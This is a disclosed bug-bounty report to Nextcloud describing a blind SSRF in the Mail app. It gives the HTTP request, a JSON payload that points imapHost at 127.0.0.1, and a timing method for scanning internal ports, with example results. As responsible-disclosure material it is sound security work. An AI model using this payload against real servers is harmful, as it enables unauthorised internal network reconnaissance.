# Mail app - blind SSRF via imapHost parameter

## Report Details
- **Report ID**: 1736390
- **URL**: https://hackerone.com/reports/1736390
- **State**: Closed
- **Severity**: low
- **Submitted**: 2022-10-15T21:08:17.663Z
- **Disclosed**: 2023-02-06T21:27:12.921Z

## Reporter
- **Username**: supr4s
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
Hi everyone,

I would like to report here a Blind SSRF vulnerability through the Nextcloud `Mail` application.

Tested on latest Mail release : `2.0.1`

## Steps To Reproduce:

During the connection process of a mail account on the integrated Mail application of Nextcloud, once all the fields validated (IMAP, STMP etc) the following POST request is made: 

```
POST /apps/mail/api/accounts HTTP/2
Host: redacted
Cookie: redacted
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: application/json, text/plain, */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
Requesttoken: redacted
Content-Length: 333
Origin:  redacted
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"imapHost":"myimapserver.org","imapPort":993,"imapSslMode":"tls","imapUser":"xxx@xxx.org","imapPassword":"xxx","smtpHost":"mysmtpserver.org","smtpPort":465,"smtpSslMode":"tls","smtpUser":"xxx@xxx.org","smtpPassword":"xxx","accountName":"xxx@xxx.orgr","emailAddress":"xxx@xxx.org"}
```

From there, the SSRF will take place with the `imapHost` parameter and the desired port number with the `imapPort` parameter.

We can already confirm this with a hit to my burp Collaborator instance 

{F1987615}

We can then use this for a port scan based on the response time.
Response time < 100ms = port closed/no listening on it.
Port > 1000ms response, port open, listening with a service on it. Here I will scan my server locally: 

```
{"imapHost":"127.0.0.1","imapPort":<port_number>,"imapSslMode":"none","imapUser":"xxx@xxx.org","imapPassword":"xxx","smtpSslMode":"none","smtpUser":"xxx@xxx.org","smtpPassword":"xxx","accountName":"xxx@xxx.org","emailAddress":"xxx@xxx.org"}
```
It is important here to leave the parameter `imapSslMode` on `none` ! 

{F1987665}

To automate, this can be done with the Intruder tool from Burp Suite.
And here the result on my server : 

```
Port 80 - response time : 5200ms - Apache2 service
Port 443 - response time : 5200ms - Apache2 service
Port 8080 - response time 5140ms - CrowdSec
Port 6060 - response time 5180ms - CrowdSec
Port 5432 - response time 5191ms -  PostgreSQL
Port 6379 - response time 5216ms - My Redis instance for Nextcloud
```

{F1987657}

I tried a lot to increase the impact of this totally blind SSRF, I don't think it is possible to increase the impact of this vulnerability.

## Impact

From [OWASP](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/) : 

> SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL).

We are here on a totally Blind SSRF vulnerability.

This vulnerability can be exploited by any user, regardless of their rights, as long as the `mail` application is installed and enabled. A malicious person can therefore retrieve the services running locally on the server, scan your internal network for interesting information about which IPs are responding, which services are running on each IP address, etc.

Looking forward to exchanging.

Regards,
Supr4s

## Attachments
- Capture_d__cran_du_2022-10-15_22-35-14.png
- dcd445133acdbe59f14c5df1334c8ae4.png
- Capture_d__cran_du_2022-10-15_22-53-34.png
- Capture_d__cran_du_2022-10-15_22-59-56.png
